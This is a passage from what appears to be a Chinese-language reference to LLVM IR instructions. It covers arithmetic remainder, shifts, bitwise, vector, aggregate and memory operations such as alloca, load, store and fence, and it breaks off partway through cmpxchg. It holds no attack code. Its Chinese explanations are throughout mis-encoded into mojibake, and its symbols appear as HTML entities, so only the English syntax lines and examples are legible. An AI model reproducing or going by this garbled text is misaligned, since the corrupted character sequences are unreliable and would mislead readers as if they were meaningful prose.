#Syntax &lt;result&gt; &#x3D; fdiv [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; fdiv float 4.0, %var ; yields float:result &#x3D; 4.0 &#x2F; %var urem æ— ç¬¦å·æ•´æ•°æ±‚ä½™ #Syntax &lt;result&gt; &#x3D; urem &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; urem i32 4, %var ; yields i32:result &#x3D; 4 % %var srem å¸¦ç¬¦å·æ•´æ•°æ±‚ä½™ #Syntax &lt;result&gt; &#x3D; srem &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; srem i32 4, %var ; yields i32:result &#x3D; 4 % %var frem æµ®ç‚¹æ•°æ±‚ä½™ #Syntax &lt;result&gt; &#x3D; frem [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; frem float 4.0, %var ; yields float:result &#x3D; 4.0 % %var ä½äºŒè¿›åˆ¶æ“ä½œæŒ‡ä»¤ (Bitwise Binary Operations) shl é€»è¾‘å·¦ç§» è¿”å›å‘å·¦ç§»ä½æŒ‡å®šçš„ç»“æœ å³ $op1 * 2^{op2} mod (2^n)$, nä¸ºresultçš„å®½åº¦ &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ï¼Œ&lt;op2&gt;ä½œä¸ºæ— ç¬¦å·å€¼æ¥å¤„ç†ã€‚å¦‚æœ&lt;op1&gt;æ˜¯å‘é‡ï¼Œ&lt;op2&gt;å°†ä¼šæŒ‰ç…§&lt;op1&gt;çš„å…ƒç´ é€ä¸ªç§»åŠ¨ å¦‚æœå­˜åœ¨nuwå…³é”®å­—ï¼Œåˆ™å¦‚æœç§»ä½ä»»ä½•éé›¶ä½ï¼Œåˆ™ç§»ä½å°†äº§ç”Ÿä¸€ä¸ªpoison value(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚ å¦‚æœnswå…³é”®å­—å­˜åœ¨ï¼Œåˆ™å¦‚æœç§»ä½ä¸ç”Ÿæˆçš„ç¬¦å·ä½ä¸ä¸€è‡´çš„ä»»ä½•ä½ï¼Œåˆ™ç§»ä½å°†äº§ç”Ÿä¸€ä¸ªpoison value(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚ #Syntax &lt;result&gt; &#x3D; shl &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; shl nuw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; shl nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; shl nuw nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; shl i32 4, %var ; yields i32: 4 &lt;&lt; %var &lt;result&gt; &#x3D; shl i32 4, 2 ; yields i32: 16 &lt;result&gt; &#x3D; shl i32 1, 10 ; yields i32: 1024 &lt;result&gt; &#x3D; shl i32 1, 32 ; undefined &lt;result&gt; &#x3D; shl &lt;2 x i32&gt; &lt; i32 1, i32 1&gt;, &lt; i32 1, i32 2&gt; ; yields: result&#x3D;&lt;2 x i32&gt; &lt; i32 2, i32 4&gt; lshr é€»è¾‘å³ç§» è¿”å›å‘å³ç§»æŒ‡å®šé›¶å¡«å……ä½çš„ç»“æœ lshræŒ‡ä»¤çš„ä¸¤ä¸ªå‚æ•°å¿…é¡»æ˜¯ç›¸åŒçš„æ•´æ•°æˆ–æ•´æ•°ç±»å‹çš„å‘é‡ã€‚op2è¢«è§†ä¸ºæ— ç¬¦å·å€¼ã€‚ çš„æœ€é«˜æœ‰æ•ˆä½åœ¨ç§»ä½åå°†è¢«é›¶ä½å¡«å……ã€‚ &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ï¼Œä½œä¸ºæ— ç¬¦å·å€¼æ¥å¤„ç†ã€‚å¦‚æœæ˜¯å‘é‡ï¼Œå°†ä¼šæŒ‰ç…§çš„å…ƒç´ é€ä¸ªç§»åŠ¨ã€‚ å¦‚æœexactå…³é”®å­—å­˜åœ¨ï¼Œå¦‚æœç§»å‡ºçš„ä»»ä½•ä½éƒ½æ˜¯éé›¶çš„ï¼Œé‚£ä¹ˆLSHRçš„ç»“æœå€¼å°±è¿”å›ä¸€ä¸ªpoison value(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚ #Syntax &lt;result&gt; &#x3D; lshr &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; lshr exact &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; lshr i32 4, 1 ; yields i32:result &#x3D; 2 &lt;result&gt; &#x3D; lshr i32 4, 2 ; yields i32:result &#x3D; 1 &lt;result&gt; &#x3D; lshr i8 4, 3 ; yields i8:result &#x3D; 0 &lt;result&gt; &#x3D; lshr i8 -2, 1 ; yields i8:result &#x3D; 0x7F &lt;result&gt; &#x3D; lshr i32 1, 32 ; undefined &lt;result&gt; &#x3D; lshr &lt;2 x i32&gt; &lt; i32 -2, i32 4&gt;, &lt; i32 1, i32 2&gt; ; yields: result&#x3D;&lt;2 x i32&gt; &lt; i32 0x7FFFFFFF, i32 1&gt; ashr ç®—æ•°å³ç§» ashræŒ‡ä»¤(ç®—æœ¯å³ç§»)é€šè¿‡ç¬¦å·æ‰©å±•è¿”å›å‘å³ç§»æŒ‡å®šä½æ•°ã€‚ çš„æœ€é«˜æœ‰æ•ˆä½å°†è¢«op1çš„ç¬¦å·ä½å¡«å……ã€‚ &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ï¼Œä½œä¸ºæ— ç¬¦å·å€¼æ¥å¤„ç†ã€‚å¦‚æœæ˜¯å‘é‡ï¼Œå°†ä¼šæŒ‰ç…§çš„å…ƒç´ é€ä¸ªç§»åŠ¨ã€‚ å¦‚æœexactå…³é”®å­—å­˜åœ¨ï¼Œå¦‚æœç§»å‡ºçš„ä»»ä½•ä½éƒ½æ˜¯éé›¶ï¼Œashrçš„ç»“æœå€¼è¿”å›ä¸€ä¸ªpoison value(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚ #Syntax &lt;result&gt; &#x3D; ashr &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; ashr exact &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; ashr i32 4, 1 ; yields i32:result &#x3D; 2 &lt;result&gt; &#x3D; ashr i32 4, 2 ; yields i32:result &#x3D; 1 &lt;result&gt; &#x3D; ashr i8 4, 3 ; yields i8:result &#x3D; 0 &lt;result&gt; &#x3D; ashr i8 -2, 1 ; yields i8:result &#x3D; -1 &lt;result&gt; &#x3D; ashr i32 1, 32 ; undefined &lt;result&gt; &#x3D; ashr &lt;2 x i32&gt; &lt; i32 -2, i32 4&gt;, &lt; i32 1, i32 3&gt; ; yields: result&#x3D;&lt;2 x i32&gt; &lt; i32 -1, i32 0&gt; and ä¸ In0 In1 Out 0 0 0 0 1 0 1 0 0 1 1 1 #Syntax &lt;result&gt; &#x3D; and &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; and i32 4, %var ; yields i32:result &#x3D; 4 &amp; %var &lt;result&gt; &#x3D; and i32 15, 40 ; yields i32:result &#x3D; 8 &lt;result&gt; &#x3D; and i32 4, 8 ; yields i32:result &#x3D; 0 or æˆ– In0 In1 Out 0 0 0 0 1 1 1 0 1 1 1 1 , ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ã€‚ #Syntax &lt;result&gt; &#x3D; or &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; or i32 4, %var ; yields i32:result &#x3D; 4 | %var &lt;result&gt; &#x3D; or i32 15, 40 ; yields i32:result &#x3D; 47 &lt;result&gt; &#x3D; or i32 4, 8 ; yields i32:result &#x3D; 12 xor å¼‚æˆ– In0 In1 Out 0 0 0 0 1 1 1 0 1 1 1 0 , ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ã€‚ #Syntax &lt;result&gt; &#x3D; xor &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; xor i32 4, %var ; yields i32:result &#x3D; 4 ^ %var &lt;result&gt; &#x3D; xor i32 15, 40 ; yields i32:result &#x3D; 39 &lt;result&gt; &#x3D; xor i32 4, 8 ; yields i32:result &#x3D; 12 &lt;result&gt; &#x3D; xor i32 %V, -1 ; yields i32:result &#x3D; ~%V å‘é‡è¿ç®—(Vector Operations) extractelement extractelementæŒ‡ä»¤ä»æŒ‡å®šç´¢å¼•å¤„çš„å‘é‡ä¸­æå–å•ä¸ªçŸ¢é‡å…ƒç´ ã€‚ #Syntax: &lt;result&gt; &#x3D; extractelement &lt;n x &lt;ty&gt;&gt; &lt;val&gt;, &lt;ty2&gt; &lt;idx&gt; ; yields &lt;ty&gt; &lt;result&gt; &#x3D; extractelement &lt;vscale x n x &lt;ty&gt;&gt; &lt;val&gt;, &lt;ty2&gt; &lt;idx&gt; ; yields &lt;ty&gt; Arguments: æå–æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ vector ç±»å‹çš„å€¼ã€‚ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯æŒ‡ç¤ºä»ä½•å¤„æå–å…ƒç´ çš„ä½ç½®çš„ç´¢å¼•ã€‚ç´¢å¼•å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°ç±»å‹çš„å˜é‡ã€‚ &lt;ty2&gt; &lt;idx&gt;ç´¢å¼•å€¼å¤§äºç­‰äºé›¶ï¼Œå°äºå‘é‡çš„é•¿åº¦ã€‚ Semantics: ç»“æœæ˜¯ä¸ val çš„å…ƒç´ ç±»å‹ç›¸åŒç±»å‹çš„çŸ¢é‡ã€‚ å®ƒçš„å€¼æ˜¯ val idx ä½ç½®çš„å€¼ã€‚ å¦‚æœidxè¶…è¿‡äº†å›ºå®šé•¿åº¦å‘é‡çš„valçš„é•¿åº¦ï¼Œç»“æœå°†æ˜¯ä¸€ä¸ªpoison value(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚ å¯¹äºå¯ä¼¸ç¼©çš„å‘é‡ï¼Œå¦‚æœidxçš„å€¼è¶…è¿‡äº†å‘é‡çš„è¿è¡Œæ—¶é•¿åº¦ï¼Œåˆ™ç»“æœæ˜¯ä¸€ä¸ªpoison value(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚ # Example: &lt;result&gt; &#x3D; extractelement &lt;4 x i32&gt; %vec, i32 0 ; yields i32 insertelement insertelementæŒ‡ä»¤å°†çŸ¢é‡å…ƒç´ æ’å…¥åˆ°æŒ‡å®šç´¢å¼•å¤„çš„å‘é‡ä¸­ã€‚ Syntax: &lt;result&gt; &#x3D; insertelement &lt;n x &lt;ty&gt;&gt; &lt;val&gt;, &lt;ty&gt; &lt;elt&gt;, &lt;ty2&gt; &lt;idx&gt; ; yields &lt;n x &lt;ty&gt;&gt; &lt;result&gt; &#x3D; insertelement &lt;vscale x n x &lt;ty&gt;&gt; &lt;val&gt;, &lt;ty&gt; &lt;elt&gt;, &lt;ty2&gt; &lt;idx&gt; ; yields &lt;vscale x n x &lt;ty&gt;&gt; Arguments: insertelementæŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ vector ç±»å‹çš„å€¼ã€‚ ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯ä¸€ä¸ªçŸ¢é‡å€¼ï¼Œå…¶ç±»å‹å¿…é¡»ç­‰äºç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„å…ƒç´ ç±»å‹ã€‚ ç¬¬ä¸‰ä¸ªæ“ä½œæ•°æ˜¯æŒ‡ç¤ºæ’å…¥å€¼çš„ä½ç½®çš„ç´¢å¼•ã€‚ ç´¢å¼•å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°ç±»å‹çš„å˜é‡ã€‚ Semantics: ç»“æœæ˜¯ä¸€ä¸ªä¸ val ç±»å‹ç›¸åŒçš„å‘é‡ã€‚ å®ƒçš„å…ƒç´ å€¼æ˜¯valçš„å€¼ï¼Œé™¤äº†ä½ç½® idxï¼Œå®ƒåœ¨è¯¥ä½ç½®è·å¾—å€¼ eltã€‚ å¦‚æœ idx è¶…è¿‡å›ºå®šé•¿åº¦å‘é‡çš„ val é•¿åº¦ï¼Œåˆ™ç»“æœæ˜¯poison value. å¯¹äºå¯ä¼¸ç¼©å‘é‡ï¼Œå¦‚æœidxçš„å€¼è¶…è¿‡äº†å‘é‡çš„è¿è¡Œæ—¶é•¿åº¦ï¼Œåˆ™ç»“æœæ˜¯poison value. # Example: &lt;result&gt; &#x3D; insertelement &lt;4 x i32&gt; %vec, i32 1, i32 0 ; yields &lt;4 x i32&gt; shufflevector shufflevectoræŒ‡ä»¤ä»ä¸¤ä¸ªè¾“å…¥å‘é‡æ„é€ å…ƒç´ çš„æ’åˆ—ï¼Œè¿”å›ä¸€ä¸ªä¸è¾“å…¥å…·æœ‰ç›¸åŒå…ƒç´ ç±»å‹ä¸”é•¿åº¦ä¸shuffle maskç›¸åŒçš„å‘é‡ã€‚ # Syntax: &lt;result&gt; &#x3D; shufflevector &lt;n x &lt;ty&gt;&gt; &lt;v1&gt;, &lt;n x &lt;ty&gt;&gt; &lt;v2&gt;, &lt;m x i32&gt; &lt;mask&gt; ; yields &lt;m x &lt;ty&gt;&gt; &lt;result&gt; &#x3D; shufflevector &lt;vscale x n x &lt;ty&gt;&gt; &lt;v1&gt;, &lt;vscale x n x &lt;ty&gt;&gt; v2, &lt;vscale x m x i32&gt; &lt;mask&gt; ; yields &lt;vscale x m x &lt;ty&gt;&gt; Arguments: æŒ‡ä»¤çš„ç»“æœæ˜¯ä¸€ä¸ªå‘é‡ï¼Œå…¶é•¿åº¦ä¸shuffle maskç›¸åŒï¼Œå…¶å…ƒç´ ç±»å‹ä¸å‰ä¸¤ä¸ªæ“ä½œæ•°çš„å…ƒç´ ç±»å‹ç›¸åŒã€‚ shufflevectoræŒ‡ä»¤çš„å‰ä¸¤ä¸ªæ“ä½œæ•°æ˜¯ç›¸åŒç±»å‹çš„å‘é‡ã€‚ ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªshuffle maskå‘é‡å¸¸é‡ï¼Œå…¶å…ƒç´ ç±»å‹ä¸ºi32ã€‚ æ©ç å‘é‡å…ƒç´ å¿…é¡»æ˜¯å¸¸é‡æ•´æ•°æˆ–undefå€¼ã€‚ &lt;n x &lt;ty&gt;&gt; &lt;v1&gt;, &lt;n x &lt;ty&gt;&gt; &lt;v2&gt;ä¸¤ä¸ªè¾“å…¥å‘é‡ï¼Œå¦‚æœè¾“å…¥å‘é‡ä¸­æœªå®šä¹‰çš„å…ƒç´ è¢«é€‰ä¸­ï¼Œåˆ™æ–°å‘é‡å¯¹åº”çš„å…ƒç´ ä¹Ÿæ˜¯æœªå®šä¹‰ã€‚ &lt;m x i32&gt; &lt;mask&gt;è°ƒæ•´æ©ç (shuffle mask)ï¼Œå¦‚æœè°ƒæ•´æ©ç æ˜¯æœªå®šä¹‰çš„ï¼Œåˆ™æ–°å‘é‡å°±æ˜¯æœªå®šä¹‰çš„ã€‚ Semantics: ä¸¤ä¸ªè¾“å…¥å‘é‡çš„å…ƒç´ åœ¨ä¸¤ä¸ªå‘é‡ä¸­ä»å·¦åˆ°å³ç¼–å·ã€‚ å¯¹äºç»“æœå‘é‡çš„æ¯ä¸ªå…ƒç´ ï¼Œéšæœºæ©ç ä»è¾“å…¥å‘é‡ä¹‹ä¸€ä¸­é€‰æ‹©ä¸€ä¸ªå…ƒç´ ä»¥å¤åˆ¶åˆ°ç»“æœä¸­ã€‚ æ©ç ä¸­çš„éè´Ÿå…ƒç´ è¡¨ç¤ºè¿æ¥è¾“å…¥å‘é‡å¯¹çš„ç´¢å¼•ã€‚ If the shuffle mask is undefined, the result vector is undefined. If the shuffle mask selects an undefined element from one of the input vectors, the resulting element is undefined. An undefined element in the mask vector specifies that the resulting element is undefined. An undefined element in the mask vector prevents a poisoned vector element from propagating. å¯¹äºå¯ä¼¸ç¼©çŸ¢é‡, the only valid mask values at present are zeroinitializer and undef, since we cannot write all indices as literals for a vector with a length unknown at compile time. Example: &lt;result&gt; &#x3D; shufflevector &lt;4 x i32&gt; %v1, &lt;4 x i32&gt; %v2, &lt;4 x i32&gt; &lt;i32 0, i32 4, i32 1, i32 5&gt; ; yields &lt;4 x i32&gt; &lt;result&gt; &#x3D; shufflevector &lt;4 x i32&gt; %v1, &lt;4 x i32&gt; undef, &lt;4 x i32&gt; &lt;i32 0, i32 1, i32 2, i32 3&gt; ; yields &lt;4 x i32&gt; - Identity shuffle. &lt;result&gt; &#x3D; shufflevector &lt;8 x i32&gt; %v1, &lt;8 x i32&gt; undef, &lt;4 x i32&gt; &lt;i32 0, i32 1, i32 2, i32 3&gt; ; yields &lt;4 x i32&gt; &lt;result&gt; &#x3D; shufflevector &lt;4 x i32&gt; %v1, &lt;4 x i32&gt; %v2, &lt;8 x i32&gt; &lt;i32 0, i32 1, i32 2, i32 3, i32 4, i32 5, i32 6, i32 7 &gt; ; yields &lt;8 x i32&gt; èšåˆæ“ä½œ(Aggregate Operations) extractvalue extractvalueæŒ‡ä»¤ä» aggregate å€¼ä¸­æå–æˆå‘˜å­—æ®µçš„å€¼ã€‚ #Syntax: &lt;result&gt; &#x3D; extractvalue &lt;aggregate type&gt; &lt;val&gt;, &lt;idx&gt;&#123;, &lt;idx&gt;&#125;* Arguments: &lt;aggregate type&gt; &lt;val&gt;èšåˆç±»å‹ï¼Œæ•°ç»„æˆ–ç»“æ„ä½“ã€‚ &lt;idx&gt;&#123;, &lt;idx&gt;&#125;*å¸¸é‡ç´¢å¼•å€¼ï¼Œæå–æŒ‡å®šç´¢å¼•å¤„çš„å…ƒç´ ã€‚ extractvalueâ€™æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ struct æˆ– [array](https://llvm.org/ docs/LangRef.html#t-array) ç±»å‹ã€‚ å…¶ä»–æ“ä½œæ•°æ˜¯å¸¸é‡ç´¢å¼•ï¼Œç”¨äºæŒ‡å®šä»¥ä¸getelementptræŒ‡ä»¤ä¸­çš„ç´¢å¼•ç±»ä¼¼çš„æ–¹å¼æå–å“ªä¸ªå€¼ã€‚ ä¸getelementptr ç´¢å¼•çš„ä¸»è¦åŒºåˆ«æ˜¯ï¼š ç”±äºè¢«ç´¢å¼•çš„å€¼ä¸æ˜¯æŒ‡é’ˆï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªç´¢å¼•è¢«çœç•¥å¹¶å‡å®šä¸ºé›¶ã€‚ å¿…é¡»è‡³å°‘æŒ‡å®šä¸€ä¸ªç´¢å¼•ã€‚ ä¸ä»…ç»“æ„ç´¢å¼•è€Œä¸”æ•°ç»„ç´¢å¼•ä¹Ÿå¿…é¡»åœ¨èŒƒå›´å†…ã€‚ Semantics: ç»“æœæ˜¯ç´¢å¼•æ“ä½œæ•°æŒ‡å®šçš„èšåˆä¸­ä½ç½®å¤„çš„å€¼ã€‚ #Example: &lt;result&gt; &#x3D; extractvalue &#123;i32, float&#125; %agg, 0 ; yields i32 insertvalue insertvalueâ€™æŒ‡ä»¤å°†ä¸€ä¸ªå€¼æ’å…¥åˆ° aggregate å€¼çš„æˆå‘˜å­—æ®µä¸­ã€‚ #Syntax: &lt;result&gt; &#x3D; insertvalue &lt;aggregate type&gt; &lt;val&gt;, &lt;ty&gt; &lt;elt&gt;, &lt;idx&gt;&#123;, &lt;idx&gt;&#125;* ; yields &lt;aggregate type&gt; Arguments: &lt;aggregate type&gt; &lt;val&gt;èšåˆç±»å‹ï¼Œæ•°ç»„æˆ–ç»“æ„ä½“ã€‚ &lt;ty&gt; &lt;elt&gt;è¦æ’å…¥çš„æ•°æ®ï¼Œ &lt;idx&gt;&#123;, &lt;idx&gt;&#125;*å¸¸é‡ç´¢å¼•å€¼ï¼Œæå–æŒ‡å®šç´¢å¼•å¤„çš„å…ƒç´ ã€‚ insertvalueâ€™æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ struct æˆ– [array](https://llvm.org/ docs/LangRef.html#t-array) ç±»å‹ã€‚ ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯è¦æ’å…¥çš„ä¸€ç­‰å€¼ã€‚ ä»¥ä¸‹æ“ä½œæ•°æ˜¯å¸¸é‡ç´¢å¼•ï¼ŒæŒ‡ç¤ºæ’å…¥å€¼çš„ä½ç½®ï¼Œå…¶æ–¹å¼ä¸extractvalueæŒ‡ä»¤ä¸­çš„ç´¢å¼•ç±»ä¼¼ã€‚ è¦æ’å…¥çš„å€¼å¿…é¡»ä¸ç´¢å¼•æ ‡è¯†çš„å€¼å…·æœ‰ç›¸åŒçš„ç±»å‹ã€‚ Semantics: The result is an aggregate of the same type as val. Its value is that of val except that the value at the position specified by the indices is that of elt. ç»“æœæ˜¯ä¸ val ç±»å‹ç›¸åŒçš„èšåˆã€‚ å®ƒçš„å€¼æ˜¯valçš„å€¼ï¼Œåªæ˜¯ç´¢å¼•æŒ‡å®šä½ç½®çš„å€¼æ˜¯eltçš„å€¼ã€‚ #Example: %agg1 &#x3D; insertvalue &#123;i32, float&#125; undef, i32 1, 0 ; yields &#123;i32 1, float undef&#125; %agg2 &#x3D; insertvalue &#123;i32, float&#125; %agg1, float %val, 1 ; yields &#123;i32 1, float %val&#125; %agg3 &#x3D; insertvalue &#123;i32, &#123;float&#125;&#125; undef, float %val, 1, 0 ; yields &#123;i32 undef, &#123;float %val&#125;&#125; å†…å­˜è®¿é—®å’Œå¯»å€æ“ä½œ(Memory Access and Addressing Operations) alloca allocaæŒ‡ä»¤åœ¨å½“å‰æ‰§è¡Œå‡½æ•°çš„æ ˆå¸§ä¸Šåˆ†é…å†…å­˜ &lt;type&gt;æŒ‡ä»¤è¿”å›çš„æŒ‡é’ˆç±»å‹ï¼Œå¯ä»¥æ˜¯ä»»ä½•ç±»å‹ã€‚ &lt;ty&gt; &lt;NumElements&gt;è¦åˆ†é…çš„å†…å­˜æ•°é‡ï¼Œåˆ†é…çš„å†…å­˜å¤§å°å°±æ˜¯è¯¥æ•°é‡*å•ä¸ªç±»å‹ç©ºé—´ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œé»˜è®¤æƒ…å†µä¸‹è¯¥å€¼ä¸º1ã€‚ align &lt;alignment&gt;å†…å­˜å¯¹é½å€¼ã€‚å¦‚æœæŒ‡å®šäº†å¯¹é½å€¼ï¼Œå¯¹é½å€¼ä¸èƒ½å¤§äº1 &lt;&lt; 29ï¼Œä¸”ä¿è¯åˆ†é…çš„å€¼ç»“æœè‡³å°‘ä¸è¯¥è¾¹ç•Œå¯¹é½ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šæˆ–è€…å¯¹é½å€¼ä¸ºé›¶ï¼Œç›®æ ‡å¯ä»¥é€‰æ‹©åœ¨ä»»ä½•ä¸ç±»å‹å…¼å®¹çš„èŒƒå›´å†…å¯¹é½åˆ†é…ã€‚ #Syntax &lt;result&gt; &#x3D; alloca [inalloca] &lt;type&gt; [, &lt;ty&gt; &lt;NumElements&gt;] [, align &lt;alignment&gt;] [, addrspace(&lt;num&gt;)] ; yields type addrspace(num)*:result #Example %ptr &#x3D; alloca i32 ; yields i32*:ptr %ptr &#x3D; alloca i32, i32 4 ; yields i32*:ptr %ptr &#x3D; alloca i32, i32 4, align 1024 ; yields i32*:ptr %ptr &#x3D; alloca i32, align 1024 ; yields i32*:ptr load loadæŒ‡ä»¤ç”¨äºä»å†…å­˜ä¸­è¯»å–ã€‚ &lt;result&gt;æ˜¯ä¸€ä¸ªå˜é‡ï¼Œå˜é‡çš„å€¼æ˜¯ä»å†…å­˜ä¸­åŠ è½½å‡ºæ¥çš„å€¼ã€‚ load &lt;ty&gt;åŠ è½½ç±»å‹ï¼Œä¹Ÿå°±æ˜¯å‰é¢å˜é‡çš„ç±»å‹ã€‚ &lt;ty&gt;* &lt;pointer&gt;æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘è¦åŠ è½½çš„å†…å­˜ï¼ŒæŒ‡é’ˆçš„ç±»å‹å¿…é¡»æ˜¯ä¸åŒ…å«ä¸é€æ˜ç»“æ„(opaque structural type)çš„first class typeç±»å‹ã€‚ #Syntax: &lt;result&gt; &#x3D; load [volatile] &lt;ty&gt;, &lt;ty&gt;* &lt;pointer&gt;[, align &lt;alignment&gt;][, !nontemporal !&lt;nontemp_node&gt;][, !invariant.load !&lt;empty_node&gt;][, !invariant.group !&lt;empty_node&gt;][, !nonnull !&lt;empty_node&gt;][, !dereferenceable !&lt;deref_bytes_node&gt;][, !dereferenceable_or_null !&lt;deref_bytes_node&gt;][, !align !&lt;align_node&gt;][, !noundef !&lt;empty_node&gt;] &lt;result&gt; &#x3D; load atomic [volatile] &lt;ty&gt;, &lt;ty&gt;* &lt;pointer&gt; [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;ordering&gt;, align &lt;alignment&gt; [, !invariant.group !&lt;empty_node&gt;] !&lt;nontemp_node&gt; &#x3D; !&#123; i32 1 &#125; !&lt;empty_node&gt; &#x3D; !&#123;&#125; !&lt;deref_bytes_node&gt; &#x3D; !&#123; i64 &lt;dereferenceable_bytes&gt; &#125; !&lt;align_node&gt; &#x3D; !&#123; i64 &lt;value_alignment&gt; &#125; #Example %ptr &#x3D; alloca i32 ; yields i32*:ptr store i32 3, i32* %ptr ; yields void %val &#x3D; load i32, i32* %ptr ; yields i32:val &#x3D; i32 3 store store æŒ‡ä»¤ç”¨äºå†™å…¥å†…å­˜ã€‚ å­˜å‚¨æŒ‡ä»¤æœ‰ä¸¤ä¸ªå‚æ•°ï¼šè¦å­˜å‚¨çš„å€¼å’Œå­˜å‚¨å®ƒçš„åœ°å€ã€‚ &lt;ty&gt; &lt;value&gt;è¦å­˜å…¥çš„å€¼ï¼Œå€¼çš„ç±»å‹å¿…é¡»æ˜¯å·²çŸ¥é•¿åº¦çš„first class typeã€‚ &lt;ty&gt;* &lt;pointer&gt;æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€å—å­˜å€¼çš„åœ°å€ã€‚ #Syntax: store [volatile] &lt;ty&gt; &lt;value&gt;, &lt;ty&gt;* &lt;pointer&gt;[, align &lt;alignment&gt;][, !nontemporal !&lt;nontemp_node&gt;][, !invariant.group !&lt;empty_node&gt;] ; yields void store atomic [volatile] &lt;ty&gt; &lt;value&gt;, &lt;ty&gt;* &lt;pointer&gt; [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;ordering&gt;, align &lt;alignment&gt; [, !invariant.group !&lt;empty_node&gt;] ; yields void !&lt;nontemp_node&gt; &#x3D; !&#123; i32 1 &#125; !&lt;empty_node&gt; &#x3D; !&#123;&#125; # Example %ptr &#x3D; alloca i32 ; yields i32*:ptr store i32 3, i32* %ptr ; yields void %val &#x3D; load i32, i32* %ptr ; yields i32:val &#x3D; i32 3 fence fenceæŒ‡ä»¤å¸¦æœ‰ä¸€ä¸ªæ’åºå‚æ•°ï¼Œå®ƒå®šä¹‰äº†ä¸å®ƒä»¬æ·»åŠ çš„è¾¹åŒæ­¥çš„å†…å®¹ã€‚ åªèƒ½ç»™å®ƒä»¬acquire, release, acq_rel, seq_cstæ’åºã€‚ #Syntax fence [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;ordering&gt; ; yields void #Exmaple fence acquire ; yields void fence syncscope(&quot;singlethread&quot;) seq_cst ; yields void fence syncscope(&quot;agent&quot;) seq_cst ; yields void cmpxchg cmpxchgæŒ‡ä»¤ç”¨äºåŸå­åœ°ä¿®æ”¹å†…å­˜ã€‚ å®ƒåœ¨å†…å­˜ä¸­åŠ è½½ä¸€ä¸ªå€¼å¹¶å°†å…¶ä¸ç»™å®šå€¼è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœå®ƒä»¬ç›¸ç­‰ï¼Œå®ƒä¼šå°è¯•å°†æ–°å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­ã€‚ #Syntax: cmpxchg [weak] [volatile] &lt;ty&gt;* &lt;pointer&gt;, &lt;ty&gt; &lt;cmp&gt;, &lt;ty&gt; 